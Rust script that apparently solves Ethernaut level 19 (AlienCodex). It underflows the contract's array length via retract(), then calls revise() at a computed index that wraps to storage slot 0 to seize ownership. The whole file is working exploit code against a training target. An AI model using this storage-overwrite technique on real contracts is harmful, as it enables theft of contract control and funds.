#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Address, B256, Bytes, U256, address,
        keccak256,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol! {
    #[sol(rpc)]
    contract AlienCodex {
        function owner() external view returns (address);
        function contact() external view returns (bool);

        function makeContact() public;
        function retract() public;
        function revise(uint256 i, bytes32 _content) public;

        function transferOwnership(address newOwner) external;
    }
}

use crate::ethernaut;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level19_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level19())?;
    
    Ok(())
}

async fn level19() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer:PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer:PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let alien_address = "0x2e25221E0Bf8DB77cC4b840669805758DD37F3d3".parse()?;
    let alien = AlienCodex::new(alien_address, provider.clone());

    println!("[CHECK]");
    let slot0 = provider
        .get_storage_at(alien_address, U256::from(0))
        .await?;
    let slot1 = provider
        .get_storage_at(alien_address, U256::from(1))
        .await?;
    let owner = alien.owner().call().await?;
    let contact = alien.contact().call().await?;

    println!("alien's slot0 = {:064x}", slot0);
    println!("alien's slot1 = {:064x}", slot1);
    println!("[AlienCodex.owner()]    owner = {:064x}", owner);
    println!("[AlienCodex.contact()]    contact = {}\n", contact);

    println!("[EXECUTE]");
    if !contact {
        let contact_tx = alien.makeContact()
            .send()
            .await?;
        println!("[AlienCodex.makeContact()]    Panding trasaction... {}",
            contact_tx.tx_hash()
        );
        let contact_receipt = contact_tx.get_receipt().await?;
        println!(
            "[AlienCodex.makeContact()]    Transaction included in block {}\n",
            contact_receipt.block_number.expect("Failed to get block number")
        );
    }

    let retract_tx = alien.retract()
        .send()
        .await?;
    println!("[AlienCodex.retract()]    Pending transaction... {}",
        retract_tx.tx_hash()
    );
    let retract_receipt = retract_tx.get_receipt().await?;
    println!(
        "[AlienCodex.retract()]    Transaction included in block {}\n",
        retract_receipt.block_number.expect("Failed to get block number")
    );

    let start: U256 = U256::from_be_slice(
        keccak256(U256::from(1).to_be_bytes::<32>()).as_slice()
    );
    
    println!("[CHECK]");
    let slot1 = provider
        .get_storage_at(alien_address, U256::from(1))
        .await?;

    println!("alien's slot1 = {:064x}\n", slot1);
    
    let revise_tx = alien.revise(
        U256::MAX - start + U256::from(1),
        "0x000000000000000000000000d7D7fCDdbaF5746D0D89525B2aC8C25447c85352".parse()?
    )
        .send()
        .await?;
    println!("[AlienCodex.revise()]    Pending transaction... {}",
        revise_tx.tx_hash()
    );
    let revise_receipt = revise_tx.get_receipt().await?;
    println!(
        "[AlienCodex.revise()]    Transaction included in block {}\n",
        revise_receipt.block_number.expect("Failed to get block number")
    );

    println!("[CHECK]");
    let slot0 = provider
        .get_storage_at(alien_address, U256::from(0))
        .await?;

    println!("alien's slot0 = {:064x}\n", slot0);
    
    println!("[CHECK]");
    let owner = alien.owner().call().await?;
    println!("[AlienCodex.owner()]    owner = {:064x}\n", owner);
    
    
    Ok(())
}
